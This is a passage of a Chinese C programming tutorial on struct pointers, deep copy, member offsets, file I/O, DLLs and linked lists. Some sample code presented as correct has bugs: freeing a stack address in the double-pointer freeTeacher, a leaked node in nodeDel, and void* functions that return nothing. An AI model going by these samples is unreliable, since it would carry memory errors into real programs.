for(i=0;i&lt;num;i++)&#123;        if(p[i].aliasname != NULL)&#123;            free(p[i].aliasname);        &#125;    &#125;    free(p);    return 0;&#125;int main() &#123;    int i =0;    int num = 3;    int res = 0;    Teacher *tmp = NULL;    res = createTeacher(&amp;tmp,num);    if(res != 0)&#123;        printf(&quot;func createTeacher has something wrong , please check and try again&quot;);        return -1;    &#125;    for(i=0;i&lt;num;i++)&#123;        printf(&quot;\nplease enter your age:&quot;);        scanf(&quot;%d&quot;,&amp;(tmp[i].age));    &#125;    printf(&quot;排序前:\n&quot;);    printArray(tmp,num);    sortArray(tmp,num);    printf(&quot;排序后:\n&quot;);    printArray(tmp,num);    freeTeacher(tmp,num);    return 0;&#125;</code></pre><p><strong>内存示意图：</strong></p><p>现在我们挑战一下使用二级指针来free内存，我这里就不再解释，如果有不理解还要参考之前我讲的内存以及上面的内存示意图：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%BB%93%E6%9E%84%E4%BD%93%E5%A5%97%E4%B8%80%E7%BA%A7%E6%8C%87%E9%92%88%E5%86%85%E5%AD%98%E5%88%86%E5%B8%83.png" alt="此处输入图片的描述"></p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;typedef struct Teacher&#123;    int age;    char name[64];    char* aliasname;&#125;Teacher;void* printArray(Teacher* p,int num)&#123;    int i = 0;    for(i=0;i&lt;num;i++)&#123;        printf(&quot;your name is :%d\n&quot;,p[i].age);    &#125;&#125;void* sortArray(Teacher* p, int num)&#123;    int i = 0,j = 0;    Teacher tmp;    for(i=0;i&lt;num;i++)&#123;        for(j=i+1;j&lt;num;j++)&#123;            if(p[i].age &gt; p[j].age)&#123;                tmp= p[j];                p[j] = p[i];                p[i] = tmp;            &#125;        &#125;    &#125;&#125;int createTeacher(Teacher** p,int num)&#123;    int i = 0;    Teacher* tmp = NULL;    tmp = (Teacher*)malloc(sizeof(Teacher)*num);    if(tmp == NULL)&#123;        return -1;    &#125;    memset(tmp,0,sizeof(Teacher)*num);    for(i=0;i&lt;num;i++)&#123;        tmp[i].aliasname = (char*)malloc(128);    &#125;    *p = tmp;    return 0;&#125;int freeTeacher(Teacher** p,int num)&#123;    int i;    if(p == NULL)&#123;        return -1;    &#125;    for(i=0;i&lt;num;i++)&#123;        if((*p)[i].aliasname != NULL)&#123;            free((*p)[i].aliasname);        &#125;    &#125;    free(*p);    free(p);    return 0;&#125;int main() &#123;    int i =0;    int num = 3;    int res = 0;    Teacher *tmp = NULL;    res = createTeacher(&amp;tmp,num);    if(res != 0)&#123;        printf(&quot;func createTeacher has something wrong , please check and try again&quot;);        return -1;    &#125;    for(i=0;i&lt;num;i++)&#123;        printf(&quot;\nplease enter your age:&quot;);        scanf(&quot;%d&quot;,&amp;(tmp[i].age));    &#125;    printf(&quot;排序前:\n&quot;);    printArray(tmp,num);    sortArray(tmp,num);    printf(&quot;排序后:\n&quot;);    printArray(tmp,num);    freeTeacher(&amp;tmp,num);    return 0;&#125;</code></pre><h3 id="九、结构体套二级指针"><a href="#九、结构体套二级指针" class="headerlink" title="九、结构体套二级指针"></a><strong>九、结构体套二级指针</strong></h3><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;typedef struct Teacher&#123;    int age;    char name[64];    char* aliasname;    char** stuname;&#125;Teacher;void* printArray(Teacher* p,int num)&#123;    int i = 0;    for(i=0;i&lt;num;i++)&#123;        printf(&quot;your name is :%d\n&quot;,p[i].age);    &#125;&#125;void* sortArray(Teacher* p, int num)&#123;    int i = 0,j = 0;    Teacher tmp;    for(i=0;i&lt;num;i++)&#123;        for(j=i+1;j&lt;num;j++)&#123;            if(p[i].age &gt; p[j].age)&#123;                tmp= p[j];                p[j] = p[i];                p[i] = tmp;            &#125;        &#125;    &#125;&#125;int createTeacher(Teacher** p,int num)&#123;    int i = 0,j = 0;    Teacher* tmp = NULL;    char** sp = NULL;    tmp = (Teacher*)malloc(sizeof(Teacher)*num);    if(tmp == NULL)&#123;        return -1;    &#125;    memset(tmp,0,sizeof(Teacher)*num);    for(i=0;i&lt;num;i++)&#123;        tmp[i].aliasname = (char*)malloc(128);        sp = (char**)malloc(num*sizeof(char*));//打造二级指针        for(j=0;j&lt;num;j++)&#123;            sp[j] = (char*)malloc(120);        &#125;        tmp[i].stuname = sp;    &#125;    *p = tmp;    return 0;&#125;int freeTeacher(Teacher* p,int num)&#123;    int i,j = 0;    char** pn = NULL;    if(p == NULL)&#123;        return -1;    &#125;    for(i=0;i&lt;num;i++)&#123;        if(p[i].aliasname != NULL)&#123;            free(p[i].aliasname);        &#125;        if(p[i].stuname != NULL)&#123;            pn = p[i].stuname;            for(j=0;j&lt;num;j++)&#123;                if(pn[j] != NULL)&#123;                    free(pn[j]);                &#125;            &#125;            free(pn);            p[i].stuname = NULL;        &#125;    &#125;        free(p);    return 0;&#125;int main() &#123;    int i = 0,j = 0;    int num = 3;    int res = 0;    Teacher *tmp = NULL;    res = createTeacher(&amp;tmp,num);    if(res != 0)&#123;        printf(&quot;func createTeacher has something wrong , please check and try again&quot;);        return -1;    &#125;    for(i=0;i&lt;num;i++)&#123;        printf(&quot;\nplease enter your age:&quot;);        scanf(&quot;%d&quot;,&amp;(tmp[i].age));        for(j=0;j&lt;num;j++)&#123;            printf(&quot;\nplease enter the student age:&quot;);            scanf(&quot;%s&quot;,tmp[i].stuname[j]);        &#125;    &#125;    printf(&quot;排序前:\n&quot;);    printArray(tmp,num);    sortArray(tmp,num);    printf(&quot;排序后:\n&quot;);    printArray(tmp,num);    freeTeacher(tmp,num);    return 0;&#125;</code></pre><p><strong>内存模型：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%BB%93%E6%9E%84%E4%BD%93%E4%BA%8C%E7%BA%A7%E6%8C%87%E9%92%88%E7%9A%84%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B.png" alt="此处输入图片的描述"></p><h3 id="十、结构体的深拷贝与浅拷贝"><a href="#十、结构体的深拷贝与浅拷贝" class="headerlink" title="十、结构体的深拷贝与浅拷贝"></a><strong>十、结构体的深拷贝与浅拷贝</strong></h3><p>当结构体中存在指针变量，并进行整体的赋值操作给另一个结构体变量的时候，默认情况下拷贝只能将指针变量的值拷贝过去，但是并不会真正的将指向的内存空间再复制一份，也就是说最终的结果只是两个指针变量指向了同一块内存空间。</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;typedef struct Teacher&#123;    char name[64];    int age;    char* pname;&#125;Teacher;void* teacherCopy(Teacher* to,Teacher* from)&#123;    *to = *from;&#125;int freeTeacher(Teacher* p)&#123;    if(p-&gt;pname == NULL)&#123;        return -1;    &#125;    free(p-&gt;pname);    p-&gt;pname = NULL;    return 0;&#125;int main() &#123;    Teacher t1;    Teacher t2;    int res;    strcpy(t1.name,&quot;tom&quot;);    t1.age = 20;    t1.pname = (char*)malloc(100);    strcpy(t1.pname,&quot;xxxxxx&quot;);    teacherCopy(&amp;t2,&amp;t1);    freeTeacher(&amp;t1);    freeTeacher(&amp;t2);    return 0;&#125;</code></pre><p>因此，如果我们对一块内存释放两次就会出现程序崩溃，解决的办法就是显示的分配内存实现深cpoy</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;typedef struct Teacher&#123;    char name[64];    int age;    char* pname;&#125;Teacher;void* teacherCopy(Teacher* to,Teacher* from)&#123;    *to = *from;    to-&gt;pname = (char*)malloc(100);    strcpy(to-&gt;pname,from-&gt;pname);&#125;int freeTeacher(Teacher* p)&#123;    if(p-&gt;pname == NULL)&#123;        return -1;    &#125;    free(p-&gt;pname);    p-&gt;pname = NULL;    return 0;&#125;int main() &#123;    Teacher t1;    Teacher t2;    int res;    strcpy(t1.name,&quot;tom&quot;);    t1.age = 20;    t1.pname = (char*)malloc(100);    strcpy(t1.pname,&quot;xxxxxx&quot;);    teacherCopy(&amp;t2,&amp;t1);    freeTeacher(&amp;t1);    freeTeacher(&amp;t2);    return 0;&#125;</code></pre><h3 id="十一、结构体的高级话题-偏移量"><a href="#十一、结构体的高级话题-偏移量" class="headerlink" title="十一、结构体的高级话题_偏移量"></a><strong>十一、结构体的高级话题_偏移量</strong></h3><h4 id="1-基础演示："><a href="#1-基础演示：" class="headerlink" title="1.基础演示："></a><strong>1.基础演示：</strong></h4><p>结构体内部的元素都是可以通过相对于结构体的偏移量来访问的</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;stdio.h&quot;typedef struct Teacher&#123;    char name[64];//64    int age;//4    int p;//4    char *pname2;//4&#125;Teacher;int main() &#123;    Teacher t1;    Teacher* p = NULL;    int offsize = (int)&amp;(p-&gt;age);    printf(&quot;%d\n&quot;,offsize);    return 0;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">64</code></pre><p>当然，更深入一点的话我们还能把下面这句</p><pre><code class="hljs">int offsize = (int)&amp;(p-&gt;age);</code></pre><p>改成这样：</p><pre><code class="hljs">int offsize = (int)&amp;(((Teacher*)0)-&gt;age);</code></pre><p><strong>原理是什么呢？</strong></p><p>其实我们就是将0处的地址按照结构体的方式进行解析，那么自然age 的相对偏移量就是64 了</p><p><strong>有什么用呢？</strong></p><p>我们可以通过这个地址找到结构体的起始位置的偏移量，简单地说就是“透过小孔看世界”。</p><h4 id="2-实际地址和相对地址"><a href="#2-实际地址和相对地址" class="headerlink" title="2.实际地址和相对地址"></a><strong>2.实际地址和相对地址</strong></h4><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;stdio.h&quot;typedef struct Teacher&#123;    char name[64];//64    int age;//4    int p;//4    char *pname2;//4&#125;Teacher;int main() &#123;    int i = 0;    char* pp;    Teacher t1;    //Teacher* p = NULL;    Teacher* p = &amp;t1;    int offsize1 = (int)&amp;(p-&gt;age);    int offsize2 = (int)&amp;(((Teacher*)0)-&gt;age);    printf(&quot;实际地址：%d\n&quot;,offsize1);    printf(&quot;相对地址：%d\n&quot;,offsize2);    return 0;&#125;</code></pre><p><strong>结果:</strong></p><pre><code class="hljs">实际地址：6422292相对地址：64</code></pre><h2 id="0X09-C语言文件操作"><a href="#0X09-C语言文件操作" class="headerlink" title="0X09 C语言文件操作"></a><strong>0X09 C语言文件操作</strong></h2><h3 id="一、文件的分类："><a href="#一、文件的分类：" class="headerlink" title="一、文件的分类："></a><strong>一、文件的分类：</strong></h3><p>1.文本文件：文本编辑器打开是可见字符的文件<br>2.二进制文件：文本编辑器打开全部是不可见字符</p><h3 id="二、文操作API-的分类："><a href="#二、文操作API-的分类：" class="headerlink" title="二、文操作API 的分类："></a><strong>二、文操作API 的分类：</strong></h3><p>（1）文件读写API </p><p>1.fgetc、fputc 按照字符的形式读写文件<br>2.fgets、fputs 按照字符串的形式（行）读写（配置）文件<br>3.fread、fwrite 按照块读写文件（大数据块迁移）</p><h3 id="三、文件按字符读写操作"><a href="#三、文件按字符读写操作" class="headerlink" title="三、文件按字符读写操作"></a><strong>三、文件按字符读写操作</strong></h3><p><strong>1.fputc 按字符写</strong></p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;int main() &#123;    int i = 0;    FILE *fp = NULL;    char* p = &quot;D:/1.txt&quot;;    char a[10] = &quot;abcdefghi&quot;;    fp = fopen(p,&quot;w+&quot;);    if(fp == NULL)&#123;        printf(&quot;func fopen has something wrong please check and try again&quot;);        return -1;    &#125;    for(i=0;i&lt;strlen(a);i++)&#123;        fputc(a[i],fp);    &#125;    fclose(fp);    return 0;&#125;</code></pre><p><strong>2.fgetc 按字符读</strong></p><p><strong>示例代码:</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;int main()&#123;    char t;    FILE* fp = NULL;    char* p = &quot;D:/1.txt&quot;;    fp = fopen(p,&quot;r+&quot;);    if(fp == NULL)&#123;        printf(&quot;func has something wrong ,please check and try again&quot;);        return -1;    &#125;    while(!feof(fp))&#123;        t = fgetc(fp);        printf(&quot;%c&quot;,t);    &#125;    return 0;&#125;</code></pre><h3 id="四、文件按行读写操作："><a href="#四、文件按行读写操作：" class="headerlink" title="四、文件按行读写操作："></a><strong>四、文件按行读写操作：</strong></h3><p>1.fputs 按行写操作：</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;int main() &#123;    FILE* fp =NULL;    char* p = &quot;D:/1.txt&quot;;    char a[10] = &quot;jklmnopqr&quot;;    fp = fopen(p,&quot;w+&quot;);    if(fp == NULL)&#123;        printf(&quot;func has something wrong please check and try again&quot;);        return -1;    &#125;    fputs(a,fp);    if(fp != NULL)&#123;        fclose(fp);    &#125;    return 0;&#125;</code></pre><p>2.fgets 按行读操作：</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;int main() &#123;    FILE* fp =NULL;    char* p = &quot;D:/1.txt&quot;;    char* pn = NULL;    char buf[1024];    fp = fopen(p,&quot;r+&quot;);    if(fp == NULL)&#123;        printf(&quot;func has something wrong please check and try again&quot;);        return -1;    &#125;    while(!feof(fp))&#123;        pn = fgets(buf,1024,fp);        if(pn == NULL)&#123;            goto END;        &#125;        printf(&quot;%s&quot;,buf);    &#125;    END:        if(fp != NULL)&#123;            fclose(fp);        &#125;    return 0;&#125;</code></pre><p>这里是一行一行的读取数据（每一行都将\n读了进去，于是我们打印的时候完全不需要自己写\n），当然我们已经规定了了总共最大的读取长度是1024自字节。</p><h3 id="五、文件按照块进行读写操作"><a href="#五、文件按照块进行读写操作" class="headerlink" title="五、文件按照块进行读写操作"></a><strong>五、文件按照块进行读写操作</strong></h3><p><strong>1.fwrite 的写操作</strong></p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;int main() &#123;    FILE* fp = NULL;    char* p = &quot;D:/1.txt&quot;;    int res = 0;    char* str = &quot;i love you&quot;;    fp = fopen(p,&quot;wb&quot;);    if(fp == NULL)&#123;        printf(&quot;func has something wrong please check and try again&quot;);        fclose(fp);        return -1;    &#125;    res = fwrite(str,strlen(str),1,fp);    if(res != 1)&#123;        printf(&quot;func has something wrong please check and try again&quot;);        fclose(fp);        return -2;    &#125;    fclose(fp);    return 0;&#125;</code></pre><p><strong>fwrite()的参数的解释：</strong></p><p>1.第一个参数是你想向文件中写的字符串首地址或者数组首地址<br>2.第二个参数是你每次操作一块的长度<br>3.第三个参数是操作的次数<br>4.第四个参数是文件句柄<br>5.返回值是写成功的次数</p><p><strong>2.fwrite 的读操作</strong></p><p><strong>示例代码：</strong><br>    #include “stdio.h”<br>    #include “stdlib.h”<br>    #include “string.h”</p><pre><code class="hljs">int main() &#123;    FILE* fp = NULL;    char* p = &quot;D:/1.txt&quot;;    char str[100] = &#123;0&#125;;    fp = fopen(p,&quot;rb&quot;);    if(fp == NULL)&#123;        printf(&quot;func1 has something wrong please check and try again&quot;);        fclose(fp);        return -1;    &#125;    fread(str,sizeof(str),1,fp);    printf(&quot;%s&quot;,str);    fclose(fp);    return 0;&#125;</code></pre><h3 id="六、配置文件读写"><a href="#六、配置文件读写" class="headerlink" title="六、配置文件读写"></a><strong>六、配置文件读写</strong></h3><h4 id="设计一个接口需要注意的几点："><a href="#设计一个接口需要注意的几点：" class="headerlink" title="设计一个接口需要注意的几点："></a><strong>设计一个接口需要注意的几点：</strong></h4><p>1.理清楚功能点（我需要提供哪些接口）<br>2.分清楚输入还是输出（是主函数分配内存还是子函数分配内存）</p><h4 id="设计理念："><a href="#设计理念：" class="headerlink" title="设计理念："></a><strong>设计理念：</strong></h4><p><strong>接口要紧，模块要松</strong></p><p><strong>什么意思呢？</strong></p><p>接口能做的事绝不会抛给上层应用完成，比如说我的写功能和修改功能在接口的封装上是重复的，我们就应该在一个接口中实现，根据用户的提供的信息判断用户是写还是修改，而不是说让用户自己判断然后调用不同的接口，再比如，我们不应该在接口中传递文件句柄，如果传递文件句柄，那么使用者还要去打开文件，万一要是网络句柄，那么还要学网络，这对上层是很不友好的，我们不能这么做，能在接口中实现的都要在接口中实现。</p><h3 id="七、大文件加解密的实现"><a href="#七、大文件加解密的实现" class="headerlink" title="七、大文件加解密的实现"></a><strong>七、大文件加解密的实现</strong></h3><p>由于文件比较大，我们不能一下子将其加到内存中进行加密，那样对内存的消耗比较大，于是我们可以采用分块加密的方式，每次加密一部分然后拼接起来。</p><h2 id="0X10-动态链接库的封装和设计"><a href="#0X10-动态链接库的封装和设计" class="headerlink" title="0X10 动态链接库的封装和设计"></a><strong>0X10 动态链接库的封装和设计</strong></h2><p><strong>先了解一下基本的名称：</strong></p><p>1.socketclient.lib 是资源 描述文件，用来描述 socketclient.dll 这个文件<br>2.socketclient.dll 是动态链接库文件，是函数二进制码的集合，里面有很多函数的函数体（动态库有自己的一套规范，在windows 下面有一套，linux 下面也有一套）</p><p><strong>了解一下基本的概念：</strong></p><ol><li>编译器是通过资源描述文件 xxx.lib 去寻找动态链接库xxx.dll（我们在编译以前需要将lib配置进编译器的链接器中的输入中）<br>2.动态库要有能力把函数导出来供其他函数调用，（dll 是由c和h组成的）实际上是在 dll 中的 c 文件中实现的</li></ol><p><strong>导出函数用到的关键字：</strong></p><p>__declspec(dllexport)</p><p>导入函数实际上不用我们单独写，程序会为我们自动调用</p><h2 id="0X11-内存泄露的原理以及检测"><a href="#0X11-内存泄露的原理以及检测" class="headerlink" title="0X11 内存泄露的原理以及检测"></a><strong>0X11 内存泄露的原理以及检测</strong></h2><p>C语言的malloc 是不能自动析构内存的，操作不当就会产生内存泄漏的问题，内存泄露并不会对程序的功能造成影响，但是长此以往，计算机的内存将被耗尽。内存泄露有许多的检测工具，比如mtrace 再比如 memwatch</p><h2 id="0X12-链表"><a href="#0X12-链表" class="headerlink" title="0X12 链表"></a><strong>0X12 链表</strong></h2><h3 id="一、结构体中套结构体"><a href="#一、结构体中套结构体" class="headerlink" title="一、结构体中套结构体"></a><strong>一、结构体中套结构体</strong></h3><p>结构体中可以嵌套其他结构体</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;typedef struct Student&#123;    int age;    char name[64];&#125;Student;typedef struct Teacher&#123;    int age;    char name[64];    Student xiaoming;&#125;Teacher;int main() &#123;    return 0;&#125;</code></pre><p><strong>注意：</strong></p><p>但是结构体中不能嵌套自己，因为编译器会首先判断结构体的大小，如果大小能正常分配的话就能编译通过（因为数据类型的本质是固定大小的不内存的别名，只有知道大小了才能分配内存），但是嵌套自己就会陷入一个无法计算大小的死循环。</p><h3 id="二、链表基础"><a href="#二、链表基础" class="headerlink" title="二、链表基础"></a><strong>二、链表基础</strong></h3><p><strong>1.链表的概念：</strong></p><p>链表是一种在内存上非连续的存储结构，由一系列的节点组成的，节点可以在运行时动态生成，节点之间通过指针链接，于是每个节点包括两个部分，一个是数据域另一个是指针域。</p><p><strong>2.链表的组成以及特点</strong></p><p>（1）链表的每一个节点都是一个结构体<br>（2）链表有两个域，数据域和指针域<br>（3）链表的指针是一个指向自己类型结构体的指针<br>（4）链表的特点是非顺序存储</p><p><strong>3.静态链表的创建和遍历</strong></p><p>静态链表意思就是固定大小长度的链表</p><p><strong>（1）创建</strong></p><p><strong>示例代码:</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;typedef struct Teacher&#123;    int data;    struct Teacher* next;&#125;Teacher;int main() &#123;    Teacher t1,t2,t3;    t1.data = 1;    t2.data = 2;    t3.data = 3;    t1.next = &amp;t2;    t2.next = &amp;t3;    t3.next = NULL;    return 0;&#125;</code></pre><p><strong>注意：</strong></p><p>静态链表的一个非常重要的缺点就是他所有的内容都是在栈区存储的，如果你想在子函数中创建然后返回给主函数，那么在返回后内存就会被自动析构，于是主函数得到的将会是一个空指针</p><p><strong>（2）遍历：</strong></p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;typedef struct Teacher&#123;    int data;    struct Teacher* next;&#125;Teacher;int main() &#123;    Teacher *p =NULL;    Teacher t1,t2,t3;    t1.data = 1;    t2.data = 2;    t3.data = 3;    t1.next = &amp;t2;    t2.next = &amp;t3;    t3.next = NULL;    p = &amp;t1;    while(p)&#123;        printf(&quot;%d\n&quot;,p-&gt;data);        p = p-&gt;next;    &#125;    return 0;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">123</code></pre><p><strong>4.链表的分类</strong></p><p>（1）带头节点的链表和不带头节点的链表<br>（2）单向链表、双向链表、循环链表<br>（3）静态链表、动态链表</p><p><strong>5.链表的元素分类：</strong></p><p>1.头结点  pHead<br>2.当前节点 pCurrent<br>3.前趋节点 pPrior<br>4.后继节点 pNext<br>5.新建节点 pMalloc</p><p><strong>6.建立带有头结点的单向链表</strong></p><p><strong>添加节点的思路：</strong></p><p>1.循环创建新节点并 malloc 分配内存<br>2.新节点加入链表<br>3.新节点变成当前节点</p><p><strong>引入三个辅助指针变量：</strong><br>1.pHead 用来指向头结点，最后返回值需要用到<br>2.pM 用来作为新分配节点的指针，在添加节点过程中有用<br>3.pCurrent 始终指向当前节点，在新节点的插入以后不断的更新，指向新的节点</p><p><strong>链表的创建与遍历：</strong></p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;typedef struct Node&#123;    int data;    struct Node* next;&#125;SLIST;//创建链表SLIST* createList()&#123;    int data =0;    SLIST* pHead;    SLIST* pCur;    SLIST* pM;    pHead = (SLIST*)malloc(sizeof(SLIST));    pCur = pHead;    if(pHead == NULL)&#123;        return NULL;    &#125;    pHead-&gt;data = 0;    pHead-&gt;next = NULL;    printf(&quot;\nplease enter your data:&quot;);    scanf(&quot;%d&quot;,&amp;data);    while(data != -1)&#123;        pM = (SLIST*)malloc(sizeof(SLIST));        if(pM == NULL)&#123;            return NULL;        &#125;        pM-&gt;data = 0;        pM-&gt;next = NULL;        pM-&gt;data = data;        pCur-&gt;next = pM;        pCur = pM;        printf(&quot;\nplease enter your data:&quot;);        scanf(&quot;%d&quot;,&amp;data);    &#125;    return pHead;&#125;//遍历链表int listPrint(SLIST* pHead)&#123;    SLIST* tmp = NULL;    if(pHead == NULL)&#123;        return -1;    &#125;    tmp = pHead-&gt;next;    printf(&quot;\nBegin\t\n&quot;);    while(tmp)&#123;        printf(&quot;%d\n&quot;,tmp-&gt;data);        tmp = tmp-&gt;next;    &#125;    printf(&quot;End\t\n&quot;);    return 0;&#125;//插入节点int nodeInsert(SLIST* pHead, int x ,int y )&#123;    return 0;&#125;//删除节点int nodeDel(SLIST* pHead , int x)&#123;    return 0;&#125;//链表销毁int listDistory(SLIST* pHead)&#123;    return 0;&#125;int main() &#123;    int res = 0;    SLIST* pHead = NULL;    pHead = createList();    //res = nodeInsert(pHead,20,19);    res = listPrint(pHead);    return 0;&#125;</code></pre><p><strong>7.链表的插入</strong></p><p>涉及到的三个指针<br>1.pM 新创建的节点<br>2.pHead 头节点<br>3.pCur 当前节点<br>4.pPrior 上一个节点</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;typedef struct Node&#123;    int data;    struct Node* next;&#125;SLIST;//创建链表SLIST* createList()&#123;    int data =0;    SLIST* pHead;    SLIST* pCur;    SLIST* pM;    pHead = (SLIST*)malloc(sizeof(SLIST));    pCur = pHead;    if(pHead == NULL)&#123;        return NULL;    &#125;    pHead-&gt;data = 0;    pHead-&gt;next = NULL;    printf(&quot;\nplease enter your data:&quot;);    scanf(&quot;%d&quot;,&amp;data);    while(data != -1)&#123;        pM = (SLIST*)malloc(sizeof(SLIST));        if(pM == NULL)&#123;            return NULL;        &#125;        pM-&gt;data = 0;        pM-&gt;next = NULL;        pM-&gt;data = data;        pCur-&gt;next = pM;        pCur = pM;        printf(&quot;\nplease enter your data:&quot;);        scanf(&quot;%d&quot;,&amp;data);    &#125;    return pHead;&#125;//遍历链表int listPrint(SLIST* pHead)&#123;    SLIST* tmp = NULL;    if(pHead == NULL)&#123;        return -1;    &#125;    tmp = pHead-&gt;next;    printf(&quot;\nBegin\t\n&quot;);    while(tmp)&#123;        printf(&quot;%d\n&quot;,tmp-&gt;data);        tmp = tmp-&gt;next;    &#125;    printf(&quot;End\t\n&quot;);    return 0;&#125;//插入节点int nodeInsert(SLIST* pHead, int x ,int y )&#123;    SLIST* pM,*pCur,*pPre;    pPre = pHead;    pCur = pPre-&gt;next;    pM = (SLIST*)malloc(sizeof(SLIST));    if(pM == NULL)&#123;        return -1;    &#125;    pM-&gt;next = NULL;    pM-&gt;data = y;    while(pCur)&#123;        if(pCur-&gt;data == x)&#123;            pM-&gt;next = pCur;            pPre-&gt;next = pM;            break;        &#125;        pPre = pCur;        pCur = pCur-&gt;next;    &#125;    return 0;&#125;//删除节点int nodeDel(SLIST* pHead , int x)&#123;    return 0;&#125;//链表销毁int listDistory(SLIST* pHead)&#123;    return 0;&#125;int main() &#123;    int res = 0;    SLIST* pHead = NULL;    pHead = createList();    res = nodeInsert(pHead,20,19);    if(res != 0)&#123;        printf(&quot;func nodeInsert has something wrong please check and try again&quot;);        return res;    &#125;    res = listPrint(pHead);    if(res != 0)&#123;        printf(&quot;func listPrint has something wrong please check and try again&quot;);        return res;    &#125;    return 0;&#125;</code></pre><p><strong>8.链表的删除与销毁</strong></p><p>销毁内存的时候一定要使用如果传入的是一级指针那么我们就应该使用二级指针来接，要不然就会出问题</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;typedef struct Node&#123;    int data;    struct Node* next;&#125;SLIST;//创建链表SLIST* createList()&#123;    int data =0;    SLIST* pHead;    SLIST* pCur;    SLIST* pM;    pHead = (SLIST*)malloc(sizeof(SLIST));    pCur = pHead;    if(pHead == NULL)&#123;        return NULL;    &#125;    pHead-&gt;data = 0;    pHead-&gt;next = NULL;    printf(&quot;\nplease enter your data:&quot;);    scanf(&quot;%d&quot;,&amp;data);    while(data != -1)&#123;        pM = (SLIST*)malloc(sizeof(SLIST));        if(pM == NULL)&#123;            return NULL;        &#125;        pM-&gt;data = 0;        pM-&gt;next = NULL;        pM-&gt;data = data;        pCur-&gt;next = pM;        pCur = pM;        printf(&quot;\nplease enter your data:&quot;);        scanf(&quot;%d&quot;,&amp;data);    &#125;    return pHead;&#125;//遍历链表int listPrint(SLIST* pHead)&#123;    SLIST* tmp = NULL;    if(pHead == NULL)&#123;        return -1;    &#125;    tmp = pHead-&gt;next;    printf(&quot;\nBegin\t\n&quot;);    while(tmp != NULL)&#123;        printf(&quot;%d\n&quot;,tmp-&gt;data);        tmp = tmp-&gt;next;    &#125;    printf(&quot;End\t\n&quot;);    return 0;&#125;//插入节点int nodeInsert(SLIST* pHead, int x ,int y )&#123;    SLIST* pM,*pCur,*pPre;    pPre = pHead;    pCur = pPre-&gt;next;    pM = (SLIST*)malloc(sizeof(SLIST));    if(pM == NULL)&#123;        return -1;    &#125;    pM-&gt;next = NULL;    pM-&gt;data = y;    while(pCur)&#123;        if(pCur-&gt;data == x)&#123;            pM-&gt;next = pCur;            pPre-&gt;next = pM;            break;        &#125;        pPre = pCur;        pCur = pCur-&gt;next;    &#125;    return 0;&#125;//删除节点int nodeDel(SLIST* pHead , int y)&#123;    SLIST* pM,*pCur,*pPre;    pPre = pHead;    pCur = pPre-&gt;next;    while(pCur)&#123;        if(pCur-&gt;data == y)&#123;            pPre-&gt;next = pCur-&gt;next;            break;        &#125;        pPre = pCur;        pCur = pCur-&gt;next;    &#125;    if(pCur == NULL)&#123;        printf(&quot;don&#39;t find the %d node ,please check and try again&quot;,y);        return -1;    &#125;    return 0;&#125;//链表销毁int listDistory(SLIST** p)&#123;    SLIST* tmp = *p;    if(NULL == p)&#123;        return -1;    &#125;    while(*p != NULL)&#123;        tmp = (*p)-&gt;next;        free(*p);        *p = tmp;    &#125;    return 0;&#125;int main() &#123;    int res = 0;    SLIST* pHead = NULL;    pHead = createList();    res = nodeInsert(pHead,20,19);    if(res != 0)&#123;        printf(&quot;func nodeInsert has something wrong please check and try again&quot;);        return res;    &#125;    res = listPrint(pHead);    if(res != 0)&#123;        printf(&quot;func listPrint has something wrong please check and try again&quot;);        return res;    &#125;    res = nodeDel(pHead,19);    if(res != 0)&#123;        printf(&quot;func listPrint has something wrong please check and try again&quot;);        return res;    &#125;    res = listPrint(pHead);    if(res != 0)&#123;        printf(&quot;func listPrint has something wrong please check and try again&quot;);        return res;    &#125;    res = listDistory(&amp;pHead);    if(res != 0)&#123;        printf(&quot;func listPrint has something wrong please check and try again&quot;);        return res;    &#125;    res = listPrint(pHead);    if(res != 0)&#123;        printf(&quot;func listPrint has something wrong please check and try again&quot;);        return res;    &#125;    return 